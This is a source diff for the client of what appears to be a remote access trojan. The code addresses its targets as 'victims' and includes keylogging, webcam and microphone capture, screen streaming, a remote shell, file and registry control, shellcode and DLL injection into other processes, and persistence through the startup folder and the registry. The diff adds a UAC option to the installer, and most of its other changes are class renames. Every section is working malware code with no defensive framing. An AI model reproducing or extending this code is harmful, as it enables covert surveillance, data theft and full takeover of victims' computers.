@@ -58,7 +58,7 @@ namespace winClient48
     {
         private string[] m_args;
         clsfnXterm m_fnXterm;
-        clsPluginMgr m_pluginMgr;
+        clsfnPluginMgr m_pluginMgr;
 
         public Form1(string[] args)
         {
@@ -198,6 +198,7 @@ namespace winClient48
         private string m_szCopyStartUp = "[IS_SZ_STARTUP]";          //Filename
         private bool m_bReg = bool.Parse("[IS_REG]");                //Registry startup.
         private string m_szRegKeyName = "[IS_REG_KEY]";              //Registry key name
+        private bool m_bUAC = bool.Parse("[IS_UAC]");
 
         //Misc
         private string m_szKeylogFileName = "[KL_FILE]";
@@ -226,29 +227,29 @@ namespace winClient48
         private int m_nDesktopDelay = 100;
 
         //MANAGER
-        private FuncInfo.PC funcInfoPC;         //PC's information.
-        private FuncInfo.Client funcInfoClient; //Client's information.
-        private AntiProcess funcAntiProcess;    //Anti-Process.
-        private FuncFile funcFile;              //File manager.
-        private FuncTask funcTask;              //Task manager.
-        private FuncReg funcReg;                //Registry editor.
-        private FuncConn funcConn;              //Network connection.
-        private FuncWindow funcWindow;          //Window manager.
-        static KeyLogger keylogger;             //keylogger.
-        private Keyboard keyboard;              //keyboard.
-        private FuncMouse funcMouse;            //Mouse controller.
-        private RemoteShell funcShell;          //Remote shell.
-        private MicAudio funcMicAudio;          //Audio, microphone.
-        private AudioPlayer funcAudioPlayer;    //Audio.
-        private FuncSystem funcSystem;          //System.
-        private FuncServ funcServ;              //Service.
-        private FuncRunScript funcRunScript;    //Run customized script.
-        private FuncFun funcFun;                //Funny.
-        private Installer installer;            //Installer
+        private clsfnInfo.PC funcInfoPC;             //PC's information.
+        private clsfnInfo.Client funcInfoClient;     //Client's information.
+        private AntiProcess funcAntiProcess;         //Anti-Process.
+        private clsfnFile funcFile;                  //File manager.
+        private clsfnTask funcTask;                  //Task manager.
+        private clsfnReg funcReg;                    //Registry editor.
+        private clsfnConn funcConn;                  //Network connection.
+        private FuncWindow funcWindow;               //Window manager.
+        static KeyLogger keylogger;                  //keylogger.
+        private Keyboard keyboard;                   //keyboard.
+        private clsfnMouse funcMouse;                //Mouse controller.
+        private clsfnRemoteShell funcShell;          //Remote shell.
+        private MicAudio funcMicAudio;               //Audio, microphone.
+        private AudioPlayer funcAudioPlayer;         //Audio.
+        private clsfnSystem funcSystem;              //System.
+        private clsfnServ funcServ;                  //Service.
+        private clsfnRunScript funcRunScript;        //Run customized script.
+        private clsfnFun funcFun;                    //Funny.
+        private clsInstaller installer;              //Installer
 
         //WEBCAM
-        static Webcam webcam;
-        static Webcam mulcam;
+        static clsfnWebcam webcam;
+        static clsfnWebcam mulcam;
         private int m_nWebcamDelay = 100;
 
         //OTHER
@@ -308,6 +309,10 @@ namespace winClient48
 
         #region Validation
 
+        /// <summary>
+        /// TCP handler.
+        /// </summary>
+        /// <param name="v"></param>
         void Received(clsVictim v)
         {
             try
@@ -421,6 +426,10 @@ namespace winClient48
             }
         }
 
+        /// <summary>
+        /// TLS handler.
+        /// </summary>
+        /// <param name="victim"></param>
         void fnTlsRecv(clsVictim victim)
         {
             try
@@ -490,6 +499,10 @@ namespace winClient48
             }
         }
 
+        /// <summary>
+        /// HTTP handler.
+        /// </summary>
+        /// <param name="victim"></param>
         void fnHttpRecv(clsVictim victim)
         {
             try 
@@ -614,7 +627,7 @@ namespace winClient48
                     if (cmd[1] == "client")
                     {
                         if (funcInfoClient == null)
-                            funcInfoClient = new FuncInfo.Client();
+                            funcInfoClient = new clsfnInfo.Client();
 
                         if (cmd[2] == "info")
                         {
@@ -679,7 +692,7 @@ namespace winClient48
                     else if (cmd[1] == "pc")
                     {
                         if (funcInfoPC == null)
-                            funcInfoPC = new FuncInfo.PC();
+                            funcInfoPC = new clsfnInfo.PC();
 
                         if (cmd[2] == "info")
                         {
@@ -810,7 +823,7 @@ namespace winClient48
                 else if (cmd[0] == "file")
                 {
                     if (funcFile == null)
-                        funcFile = new FuncFile();
+                        funcFile = new clsfnFile();
 
                     if (cmd[1] == "init")
                     {
@@ -864,7 +877,7 @@ namespace winClient48
                             }
                         }
 
-                        v.SendCommand($"file|sd|" + dir + "|" + data);
+                        v.SendCommand($"file|sd|{dir}|{data}|{val.nTotalDir}|{val.nTotalFile}");
                     }
                     else if (cmd[1] == "goto") //GOTO DIRECTORY
                     {
@@ -1077,7 +1090,7 @@ namespace winClient48
                 else if (cmd[0] == "task")
                 {
                     if (funcTask == null)
-                        funcTask = new FuncTask();
+                        funcTask = new clsfnTask();
 
                     if (cmd[1] == "init")
                     {
@@ -1152,7 +1165,7 @@ namespace winClient48
                 else if (cmd[0] == "reg") //REGISTRY
                 {
                     if (funcReg == null)
-                        funcReg = new FuncReg();
+                        funcReg = new clsfnReg();
 
                     if (cmd[1] == "init") //INITIALIZATION
                     {
@@ -1316,7 +1329,7 @@ namespace winClient48
                 else if (cmd[0] == "conn")
                 {
                     if (funcConn == null)
-                        funcConn = new FuncConn();
+                        funcConn = new clsfnConn();
 
                     if (cmd[1] == "init")
                     {
@@ -1368,7 +1381,7 @@ namespace winClient48
                                 string.Join(",", new string[]
                                 {
                                     clsCrypto.b64E2Str(s.szTitle),
-                                    s.iWindow == null ? "?" : Global.IconToBase64(s.iWindow),
+                                    s.iWindow == null ? "?" : clsGlobal.IconToBase64(s.iWindow),
                                     clsCrypto.b64E2Str(s.szFilePath),
                                     s.szProcessName == null ? "[Access Denial]" : s.szProcessName,
                                     s.nProcessId == null ? "[Access Denial]" : s.nProcessId.ToString(),
@@ -1385,12 +1398,12 @@ namespace winClient48
                         if (cmd[2] == "api") //DC
                         {
                             var x = funcWindow.CaptureWindowWithAPI(hWnd);
-                            v.SendCommand($"window|shot|{cmd[3]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}|{(x.Item3 == null ? string.Empty : Global.ImageToBase64(x.Item3))}");
+                            v.SendCommand($"window|shot|{cmd[3]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}|{(x.Item3 == null ? string.Empty : clsGlobal.ImageToBase64(x.Item3))}");
                         }
                         else if (cmd[2] == "fore")
                         {
                             var x = funcWindow.CaptureWindowWithFore(hWnd);
-                            v.SendCommand($"window|shot|{cmd[3]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}|{(x.Item3 == null ? string.Empty : Global.ImageToBase64(x.Item3))}");
+                            v.SendCommand($"window|shot|{cmd[3]}|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}|{(x.Item3 == null ? string.Empty : clsGlobal.ImageToBase64(x.Item3))}");
                         }
                     } 
                 }
@@ -1400,7 +1413,7 @@ namespace winClient48
                 else if (cmd[0] == "system") //WINDOWS SYSTEM (CONTROL PANEL)
                 {
                     if (funcSystem == null)
-                        funcSystem = new FuncSystem();
+                        funcSystem = new clsfnSystem();
 
                     if (cmd[1] == "app")
                     {
@@ -1414,7 +1427,7 @@ namespace winClient48
                         {
                             string id = clsCrypto.b64E2Str(cmd[3]);
                             string query = $"select * from win32_product where productid = '{id}'";
-                            string[] fields = Global.WMI_QueryNoEncode(query);
+                            string[] fields = clsGlobal.WMI_QueryNoEncode(query);
 
 
                         }
@@ -1453,7 +1466,7 @@ namespace winClient48
                         {
                             string szDeviceName = clsCrypto.b64D2Str(cmd[3]);
                             var x = funcSystem.DeviceGetInfo(szDeviceName);
-                            FuncSystem.DeviceInfo info = x.Item3;
+                            clsfnSystem.DeviceInfo info = x.Item3;
 
                             string payload = string.Join("|", new string[]
                             {
@@ -1506,7 +1519,7 @@ namespace winClient48
                     {
                         string exePath = clsCrypto.b64D2Str(cmd[2]);
                         string init_path = clsCrypto.b64D2Str(cmd[3]);
-                        funcShell = new RemoteShell(v, exePath, init_path);
+                        funcShell = new clsfnRemoteShell(v, exePath, init_path);
                     }
                     else if (cmd[1] == "cmd")
                     {
@@ -1557,7 +1570,7 @@ namespace winClient48
                         }
                         else
                         {
-                            new Thread(() => v.SendCommand("desktop|screenshot|" + Global.BitmapToBase64(fnScreenShot(v, device_name, width, height)) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
+                            new Thread(() => v.SendCommand("desktop|screenshot|" + clsGlobal.BitmapToBase64(fnScreenShot(v, device_name, width, height)) + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"))).Start();
                         }
                     }
                     else if (cmd[1] == "stop")
@@ -1575,7 +1588,7 @@ namespace winClient48
                 else if (cmd[0] == "mouse")
                 {
                     if (funcMouse == null)
-                        funcMouse = new FuncMouse();
+                        funcMouse = new clsfnMouse();
 
                     if (cmd[1] == "status")
                     {
@@ -1681,7 +1694,7 @@ namespace winClient48
                 {
                     if (cmd[1] == "init")
                     {
-                        webcam = new Webcam();
+                        webcam = new clsfnWebcam();
                         v.SendCommand("webcam|init|" + string.Join(",", webcam.GetDevices()));
                     }
                     else if (cmd[1] == "start" || cmd[1] == "snapshot")
@@ -1696,7 +1709,7 @@ namespace winClient48
                             webcam = null;
                         }
 
-                        webcam = new Webcam();
+                        webcam = new clsfnWebcam();
                         webcam.stop_capture = false;
                         webcam.snapshot = (cmd[1] == "snapshot");
                         webcam.monitor = (cmd[3] == "monitor");
@@ -1739,7 +1752,7 @@ namespace winClient48
                     if (keyboard == null)
                         keyboard = new Keyboard(keylogger);
                     if (funcFun == null)
-                        funcFun = new FuncFun();
+                        funcFun = new clsfnFun();
 
                     if (cmd[1] == "msg")
                     {
@@ -1905,14 +1918,14 @@ namespace winClient48
                     {
                         if (cmd[2] == "set")
                         {
-                            Image img = Global.Base64ToImage(cmd[3]);
+                            Image img = clsGlobal.Base64ToImage(cmd[3]);
                             var x = funcFun.SetWallpaper(img);
                             v.SendCommand($"fun|wp|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}");
                         }
                         else if (cmd[2] == "get")
                         {
                             var x = funcFun.GetWallpaper();
-                            string szB64Img = x.Item3 == null ? string.Empty : Global.BitmapToBase64((Bitmap)x.Item3);
+                            string szB64Img = x.Item3 == null ? string.Empty : clsGlobal.BitmapToBase64((Bitmap)x.Item3);
 
                             v.SendCommand($"fun|wp|get|{x.Item1}|{clsCrypto.b64E2Str(x.Item2)}|{szB64Img}");
                         }
@@ -2055,19 +2068,19 @@ namespace winClient48
                 {
                     if (cmd[1] == "st")
                     {
-                        FuncPower.Shutdown(int.Parse(cmd[2]));
+                        clsfnPower.Shutdown(int.Parse(cmd[2]));
                     }
                     else if (cmd[1] == "rs")
                     {
-                        FuncPower.Restart(int.Parse(cmd[2]));
+                        clsfnPower.Restart(int.Parse(cmd[2]));
                     }
                     else if (cmd[1] == "lo")
                     {
-                        FuncPower.Logoff();
+                        clsfnPower.Logoff();
                     }
                     else if (cmd[1] == "sl")
                     {
-                        FuncPower.Sleep();
+                        clsfnPower.Sleep();
                     }
                 }
 
@@ -2262,7 +2275,7 @@ namespace winClient48
                 else if (cmd[0] == "exec") //Execute
                 {
                     if (funcRunScript == null)
-                        funcRunScript = new FuncRunScript();
+                        funcRunScript = new clsfnRunScript();
 
                     if (cmd[1] == "bat")
                     {
@@ -2373,15 +2386,15 @@ namespace winClient48
                     {
                         case DllLoaderMethod.CreateRemoteThread:
                             int nProcId = int.Parse(cmd[3]);
-                            x = clsLoader.fnRemoteThread(abBuffer, nProcId);
+                            x = clsfnLoader.fnRemoteThread(abBuffer, nProcId);
                             break;
                         case DllLoaderMethod.DotNetAssemblyLoad:
                             string szTypeName = cmd[3];
                             string szMethod = cmd[4];
-                            x = clsLoader.fnLoadDotNetDll(abBuffer, szTypeName, szMethod);
+                            x = clsfnLoader.fnLoadDotNetDll(abBuffer, szTypeName, szMethod);
                             break;
                         case DllLoaderMethod.ShellCode:
-                            x = clsLoader.fnInjectShellCode(abBuffer);
+                            x = clsfnLoader.fnInjectShellCode(abBuffer);
                             break;
                     }
 
@@ -2395,7 +2408,7 @@ namespace winClient48
                     if (m_pluginMgr == null)
                     {
                         var context = new clsPluginContext();
-                        m_pluginMgr = new clsPluginMgr(context);
+                        m_pluginMgr = new clsfnPluginMgr(context);
                     }
                     
                     if (cmd[1] == "ls")
@@ -2707,7 +2720,7 @@ namespace winClient48
             while (is_connected && send_screenshot)
             {
                 Bitmap bmp = fnScreenShot(v, device_name, width, height);
-                string b64_img = Global.BitmapToBase64(bmp);
+                string b64_img = clsGlobal.BitmapToBase64(bmp);
                 v.SendCommand("desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                 Thread.Sleep(m_nDesktopDelay);
             }
@@ -2767,13 +2780,13 @@ namespace winClient48
                         clntConfig.szOnlineID,
                         Environment.UserName,
                         isAdmin() ? "Yes" : "No",
-                        Global.getOS(),
+                        clsGlobal.getOS(),
                         "", //PING
-                        Global.getCPU(), //CPU
+                        clsGlobal.getCPU(), //CPU
                         Screen.AllScreens.Length.ToString(), //MONITOR
-                        new Webcam().GetDevices().Count.ToString(), //WEBCAM
-                        clsCrypto.b64E2Str(Global.GetActiveWindowTitle()),
-                        send_screen ? Global.BitmapToBase64(fnScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height)) : string.Empty,
+                        new clsfnWebcam().GetDevices().Count.ToString(), //WEBCAM
+                        clsCrypto.b64E2Str(clsGlobal.GetActiveWindowTitle()),
+                        send_screen ? clsGlobal.BitmapToBase64(fnScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height)) : string.Empty,
                     };
 
                     string info = string.Join("|", info_array);
@@ -2883,7 +2896,7 @@ namespace winClient48
         {
             try
             {
-                installer = new Installer();
+                installer = new clsInstaller();
                 installer.m_szCurrentPath = Process.GetCurrentProcess().MainModule.FileName;
                 installer.m_bCopyDir = m_bCopyDir;
                 installer.m_szCopyPath = Environment.ExpandEnvironmentVariables(Path.Combine(m_szCopyDir, Path.GetFileName(installer.m_szCurrentPath)));
@@ -2891,6 +2904,7 @@ namespace winClient48
                 installer.m_szStartUpName = Environment.ExpandEnvironmentVariables(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), m_szCopyStartUp));
                 installer.m_bReg = m_bReg;
                 installer.m_szRegKeyName = m_szRegKeyName;
+                installer.m_bUAC = m_bUAC;
 
                 installer.Start();
 
